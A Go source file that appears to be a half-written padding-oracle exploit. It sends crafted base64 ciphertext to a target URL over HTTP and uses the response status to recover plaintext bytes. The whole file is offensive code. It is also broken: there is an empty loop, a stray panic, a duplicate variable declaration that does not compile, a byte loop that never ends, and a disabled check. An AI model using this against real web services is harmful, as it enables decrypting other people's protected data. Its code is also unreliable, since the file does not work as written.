package pax

import (
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"net/http"
	"net/url"
	"strings"
)

func Exploit(url string, sample string, blockSize int) (string, error) {
	return newExploiter(url, sample, blockSize).run()
}

type exploiter struct {
	client    *http.Client
	sample    string
	url       string
	blockSize int
	encoded   bool
}

func newExploiter(url string, sample string, blockSize int) *exploiter {
	return &exploiter{
		sample:    sample,
		url:       url,
		blockSize: blockSize,
		client:    &http.Client{},
	}
}

func (x *exploiter) run() (string, error) {

	rawb64, err := url.QueryUnescape(x.sample)
	if err != nil {
		return "", err
	}

	sample, err := base64.StdEncoding.DecodeString(rawb64)
	x.encoded = err == nil
	if !x.encoded { // if this isn't valid base64, just take it as literal encrypted bytes
		return "", err
	}

	if len(sample)%x.blockSize > 0 {
		return "", fmt.Errorf("sample data is incorrect length for given blocksize")
	}

	valid, err := x.try(sample)
	if err != nil {
		return "", err
	}
	if !valid {
		return "", fmt.Errorf("sample data does not appear to be valid")
	}

	intermediate := make([]byte, x.blockSize)
	plaintext := make([]byte, x.blockSize)

	random := make([]byte, x.blockSize)
	if _, err := rand.Read(random); err != nil {
		return "", err
	}

	blockCount := len(sample) / x.blockSize

	for blockIndex := 1; blockIndex < blockCount; blockIndex++ {

	}

	targetBlock := sample[len(sample)-x.blockSize:]
	crafted := append(random, targetBlock...)

	var found bool
	var i byte
	for i = 0; i <= 255; i++ {
		crafted[x.blockSize-1] = i
		valid, err := x.try(crafted)
		if err != nil {
			return "", err
		}
		fmt.Printf("%d: %t\n", i, valid)
		if valid {
			found = true
			break
		}
	}

	if !found {
		return "", fmt.Errorf("could not find bad padding")
	}

	/*

		C1' = crafted[0:16]
		P2' = ???????????????1
		P2  = ????????????????
		I2  = intermediate

		I2     = C1'     ^ P2'
		I2[16] = C1'[16] ^ P2'[16]
		       = 94      ^ 01
		       = 95

	*/

	intermediate[x.blockSize-1] = crafted[x.blockSize-1] ^ 0x01

	/*
		C1 = targetBlock

		P2[16] = C1[16] ^ I2[16]
		= C1[16] ^ 95
	*/

	plaintext[x.blockSize-1] = sample[len(sample)-x.blockSize-1] ^ intermediate[x.blockSize-1]

	panic(plaintext[x.blockSize-1])

	blockCount := len(sample) / x.blockSize
	_ = blockCount
	_ = intermediate

	return "", fmt.Errorf("not implemented")
}

// returns true if payload is valid
func (x *exploiter) try(payload []byte) (bool, error) {

	fmt.Printf("%d\n", payload[x.blockSize-1])

	encoded := base64.StdEncoding.EncodeToString(payload)

	url := strings.ReplaceAll(x.url, x.sample, encoded)
	if url == x.url {
		//return false, fmt.Errorf("sample data not found in url: data: '%s' url: '%s'", x.sample, x.url)
	}

	fmt.Println(url)

	req, err := http.NewRequest(http.MethodGet, url, nil)
	if err != nil {
		return false, err
	}

	response, err := x.client.Do(req)
	if err != nil {
		return false, err
	}

	if response.StatusCode > 399 {
		return false, nil
	}

	return true, nil
}
